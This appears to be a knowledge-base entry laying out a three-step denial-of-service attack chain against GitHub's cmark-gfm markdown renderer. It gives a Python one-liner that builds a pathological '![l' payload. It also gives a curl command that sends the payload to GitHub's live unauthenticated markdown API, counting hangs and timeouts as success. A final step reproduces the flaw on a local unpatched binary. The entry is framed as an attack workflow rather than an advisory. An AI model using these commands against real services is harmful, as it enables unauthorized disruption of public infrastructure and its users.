---
tags:
  - dos
  - resource-exhaustion
  - markdown
  - github
  - cmark-gfm
type: attack_chain
tools:
  - '[[tools/cmark-gfm]]'
  - '[[tools/python3]]'
tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Craft-Malicious-Markdown-Payload-for-cmark-gfm]]'
  - '[[procedures/Submit-Payload-to-GitHub-Markdown-API]]'
  - '[[procedures/Verify-Vulnerability-in-cmark-gfm-Locally]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[OS Exhaustion Flood]]'
updated_at: '2025-12-14T17:32:39.300Z'
description: >-
  Multi-stage attack exploiting polynomial time complexity in GitHub's cmark-gfm
  library to cause resource exhaustion and denial of service on the
  unauthenticated markdown API.
skill_level: intermediate
impact_level: high
id: 7ff644a9-5494-463a-a28d-ba69113ff7f1
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Impact]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[OS Exhaustion Flood]]'
---
# DoS via Polynomial Time Complexity in GitHub cmark-gfm Autolink Extension

Multi-stage attack chain demonstrating a complete denial of service workflow targeting GitHub's markdown rendering services through a vulnerability in the cmark-gfm library's autolink extension.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Craft Payload] --> B[Submit to API]
    B --> C[Verify Locally]
    A:::red
    B:::orange
    C:::blue

    classDef red fill:#e74c3c
    classDef orange fill:#f39c12
    classDef blue fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/python3]]
- [[tools/cmark-gfm]]

### Target Environment

- Web platform with access to GitHub's unauthenticated markdown API
- Local setup with unpatched cmark-gfm (versions < 0.29.0.gfm.6)
- No specific ports required; API is over HTTPS

### Initial Access Requirements

- No credentials needed (unauthenticated API)
- Internet access to submit payloads
- Local environment for verification

## Detailed Attack Procedures

### Step 1: Craft Malicious Markdown Payload
procedure: [[procedures/Craft-Malicious-Markdown-Payload-for-cmark-gfm]]

**Objective**: Generate a specially crafted markdown input that triggers polynomial time complexity in the autolink extension, leading to excessive computation.

**Instructions**: Use [[commands/generate-cmark-gfm-dos-payload]] to create the payload with repeated '![l' patterns:

```bash
python3 -c 'print("![l"* 100000 + "\n")'
```

Save the output to a file for submission.

**Expected Output**: A long string with 100,000 repetitions of '![l' followed by a newline.

**Success Indicators**:
- Payload file generated without errors
- String length confirms repetition count

### Step 2: Submit Payload to GitHub Markdown API
procedure: [[procedures/Submit-Payload-to-GitHub-Markdown-API]]

**Objective**: Deliver the malicious payload to the vulnerable API endpoint to cause resource exhaustion and DoS.

**Instructions**: Use curl or a similar tool to POST the payload to the GitHub markdown API endpoint (e.g., https://api.github.com/markdown/raw). Read the payload from the file created in Step 1:

```bash
curl -X POST -H "Content-Type: text/plain" --data-binary @payload.txt https://api.github.com/markdown/raw
```

Monitor for delays or errors indicating resource exhaustion.

**Expected Output**: API response delayed or timed out due to processing hang; no immediate HTML output.

**Success Indicators**:
- Request hangs or times out (>30 seconds)
- Server-side logs (if accessible) show high CPU usage

### Step 3: Verify Vulnerability Locally
procedure: [[procedures/Verify-Vulnerability-in-cmark-gfm-Locally]]

**Objective**: Confirm the exploit behavior on a local unpatched cmark-gfm installation.

**Instructions**: Pipe the generated payload into the cmark-gfm binary with autolink enabled using [[commands/verify-cmark-gfm-dos]]:

```bash
python3 -c 'print("![l"* 100000 + "\n")' | ./cmark-gfm -e autolink
```

Observe system resource usage during execution on unpatched versions.

**Expected Output**: Process hangs, high CPU/memory usage, or crash on unpatched cmark-gfm; quick rendering on patched version 0.29.0.gfm.6.

**Success Indicators**:
- Resource exhaustion observed locally
- No exhaustion on patched version

## Attack Chain Summary

### Key Achievements

1. Successful payload crafting exploiting autolink parsing flaw
2. Remote DoS on GitHub's markdown services without authentication
3. Local verification confirming vulnerability impact

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[OS Exhaustion Flood]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Impact]]

---
*Last updated: 2023-10-01T00:00:00Z*
